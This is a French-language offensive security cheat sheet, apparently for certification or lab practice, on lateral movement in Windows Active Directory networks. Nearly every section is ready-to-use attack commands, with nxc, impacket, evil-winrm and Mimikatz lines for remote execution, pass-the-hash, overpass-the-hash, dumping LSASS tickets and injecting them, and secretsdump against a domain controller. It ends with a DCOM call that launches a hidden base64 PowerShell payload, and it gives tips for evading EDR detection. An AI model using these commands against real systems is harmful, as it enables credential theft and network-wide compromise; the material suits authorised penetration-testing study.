# Lateral Movement

## WMI

Exécute des processus à distance via `Win32_Process.Create`. Nécessite d'être membre du groupe **Administrators local** sur la cible (les domain users ne sont pas soumis aux restrictions UAC distantes).

**nxc / impacket-wmiexec (depuis Kali)**

```bash
# nxc
nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami"
nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method wmiexec

# impacket — shell interactif
impacket-wmiexec corp.com/<user>:<password>@<IP_CIBLE>
```

Ports utilisés par `wmiexec` :
- **135** (DCOM/RPC) — exécution de la commande via WMI
- **445** (SMB/ADMIN$) — récupération de l'output (fichier temporaire sur le partage admin)

Si seul le port **445** est disponible, utiliser `smbexec` — crée un service temporaire via SCM, sans passer par WMI : 
```bash
nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method smbexec
```

**PowerShell (Windows)** : `Get-WmiObject`, `Invoke-WmiMethod`

> Les processus WMI sont créés en **session 0** (isolation système) — invisibles dans la session utilisateur active.

## WinRM

Protocole WS-Management sur TCP **5985** (HTTP) / **5986** (HTTPS). Nécessite d'être membre de **Administrators** ou **Remote Management Users** sur la cible.

**evil-winrm (shell interactif)**

```bash
evil-winrm -i <IP_CIBLE> -u <user> -p <password>
```

**nxc (exécution de commande)**

```bash
nxc winrm <IP_CIBLE> -u <user> -p <password> -X "whoami"
```

**PowerShell (Windows)** : `Enter-PSSession`, `Invoke-Command`, `New-PSSession`

> WinRM souffre du **Kerberos Double Hop** — les credentials ne se propagent pas aux ressources réseau distantes depuis la session. Préférer WMI pour éviter ce problème.

## PsExec

Protocole : **SMB uniquement, port 445**. Nécessite admin local sur la cible + partage ADMIN$ accessible.

Fonctionnement : copie un binaire service (`PSEXESVC.exe`) sur ADMIN$, le démarre via le SCM (Service Control Manager), puis communique via un named pipe dédié.

> Très bruyant : écrit sur le disque, crée un service — détecté par presque tous les EDR. Préférer WMI pour la discrétion.

**impacket-psexec (depuis Kali)**

```bash
impacket-psexec corp.com/<user>:<password>@<IP_CIBLE>
```

**nxc avec smbexec (équivalent psexec via nxc)**

```bash
# smbexec = crée un service pour exécuter la commande, tout via SMB (port 445 uniquement)
nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method smbexec
```

> nxc tente les méthodes dans cet ordre si aucune n'est forcée : `wmiexec` → `atexec` → `smbexec`

**PsExec64.exe Windows — [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)**

```cmd
.\PsExec64.exe -i \\<HOSTNAME> -u corp\<user> -p <password> cmd
```

## Pass the Hash (PtH)

Authentification avec le hash NTLM directement, sans le mot de passe en clair. Fonctionne uniquement avec **NTLM** — pas avec Kerberos.

> Limitation : depuis le patch 2014, PtH ne fonctionne qu'avec le compte **Administrator local intégré** (RID 500) et les comptes de domaine. Les autres comptes admin locaux sont bloqués par défaut.

**NetExec**

```bash
# SMB
nxc smb <IP> -u Administrator -H '<NTLM_HASH>'

# WinRM
nxc winrm <IP> -u Administrator -H '<NTLM_HASH>'

# RDP
nxc rdp <IP> -u Administrator -H '<NTLM_HASH>'

# LDAP
nxc ldap <IP> -u Administrator -H '<NTLM_HASH>'
```

**impacket**

```bash
# shell via WMI
impacket-wmiexec -hashes :'<NTLM_HASH>' Administrator@<IP_CIBLE>

# shell via PsExec (crée un service)
impacket-psexec -hashes :'<NTLM_HASH>' Administrator@<IP_CIBLE>
```

**smbclient**

```bash
smbclient \\\\<IP_CIBLE>\\<SHARE> -U Administrator --pw-nt-hash '<NTLM_HASH>'
```

**evil-winrm**

```bash
evil-winrm -i <IP_CIBLE> -u Administrator -H '<NTLM_HASH>'
```

## Overpass the Hash

Convertit un **hash NTLM** en **TGT Kerberos**. Utile quand NTLM est bloqué, ou pour utiliser des outils Kerberos uniquement (PsExec Sysinternals original, etc.).

> Le KDC délivre ensuite les TGS automatiquement à partir du TGT pour chaque service demandé.

**Linux**

Obtenir le TGT

```bash
# impacket
impacket-getTGT corp.com/<user> -hashes :<NTLM_HASH> -dc-ip <IP_DC>

# nxc
nxc smb <IP_DC> -u <user> -H <NTLM_HASH> --generate-tgt /tmp/<user>.ccache
```

Utiliser le TGT

```bash
export KRB5CCNAME=/tmp/<user>.ccache

# impacket (-target-ip si le hostname ne résout pas sur Kali)
impacket-psexec -k -no-pass corp.com/<user>@<HOSTNAME> -dc-ip <IP_DC> -target-ip <IP_CIBLE>
impacket-wmiexec -k -no-pass corp.com/<user>@<HOSTNAME> -dc-ip <IP_DC> -target-ip <IP_CIBLE>
impacket-smbclient -k -no-pass corp.com/<user>@<HOSTNAME> -dc-ip <IP_DC> -target-ip <IP_CIBLE>
impacket-secretsdump -k -no-pass corp.com/<user>@<HOSTNAME_DC> -dc-ip <IP_DC> -target-ip <IP_DC>

# nxc
nxc smb <IP_CIBLE> -u <user> -k --use-kcache --kdcHost <IP_DC>
```

**Windows (Mimikatz)**

```
sekurlsa::pth /user:<user> /domain:corp.com /ntlm:<NTLM_HASH> /run:powershell
```

Spawne un PowerShell. Déclencher un AS-REQ pour générer le TGT en mémoire :

```powershell
net use \\<HOSTNAME>   # force l'obtention du TGT
klist                  # vérifier
.\PsExec.exe \\<HOSTNAME> cmd
```

**Lire la sortie de `klist`**

| Champ | TGT | TGS |
|---|---|---|
| `Server` | `krbtgt/CORP.COM` | `cifs/files04`, `http/web04`… |
| `Ticket Flags` | contient `initial` | pas de flag `initial` |
| Obtenu via | AS-REQ (1ère étape) | TGS-REQ (échange du TGT) |

> `forwardable` = le ticket peut être transmis à un autre service (attention en contexte de délégation Kerberos non contrainte).

## Pass the Ticket (PtT)

Voler un TGT ou TGS depuis la mémoire LSASS d'une machine et l'utiliser dans une autre session. Contrairement à PtH et Overpass the Hash, on réutilise un **ticket déjà émis** — utile quand on n'a pas le hash du compte cible.

> Le TGT est réutilisable pour n'importe quel service pendant ~10h. Le TGS est limité au service pour lequel il a été émis.

**Linux (nxc + lsassy)**

1. Extraire les tickets de LSASS à distance
```bash
nxc smb <IP_CIBLE> -u <user> -H <NTLM_HASH> -M lsassy
```

2. Choisir et charger le ticket
```bash
ls -l ~/.nxc/modules/lsassy/
# Format des fichiers : TYPE_DOMAINE_USER_SERVICE_CIBLE_ID_IP_TIMESTAMP.ccache

# TGS_CORP.COM_dave_cifs_web04_[...].ccache  → accès SMB à web04
# TGS_CORP.COM_dave_ldap_dc1_[...].ccache   → accès LDAP au DC
# TGT_CORP.COM_dave_krbtgt_[...].ccache     → TGT réutilisable pour tout service

export KRB5CCNAME='/home/kali/.nxc/modules/lsassy/TG[...].ccache'
```

3. Utiliser le ticket
```bash
nxc smb <IP_CIBLE> -u <user> -k --use-kcache --kdcHost <IP_DC>
```

**Windows (Mimikatz)**

```
# 1. Exporter tous les tickets en .kirbi
privilege::debug
sekurlsa::tickets /export

# 2. Injecter le ticket choisi
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

# 3. Vérifier et utiliser
klist
ls \\web04\backup
```

## DCOM

Exécution distante via les objets COM/DCOM. Utilise RPC sur le port **135**. Nécessite admin local sur la cible.

Objet utilisé : **MMC20.Application** → méthode `Document.ActiveView.ExecuteShellCommand`

**Kali (impacket-dcomexec)**

```bash
# Par défaut : ShellWindows (nécessite explorer.exe actif → échoue sur les serveurs sans session interactive)
# Préférer MMC20 qui tourne en Session 0 (indépendant des sessions utilisateur)
impacket-dcomexec -object MMC20 corp.com/<user>:<password>@<IP_CIBLE>
impacket-dcomexec -object ShellWindows corp.com/<user>:<password>@<IP_CIBLE>
impacket-dcomexec -object ShellBrowserWindow corp.com/<user>:<password>@<IP_CIBLE>

# Avec hash NTLM
impacket-dcomexec -hashes :<NTLM_HASH> corp.com/<user>@<IP_CIBLE>
```

**Windows (PowerShell)**

```powershell
# Instancier l'objet MMC distant
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP_CIBLE>"))

# Exécuter une commande
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64_PAYLOAD>","7")
```

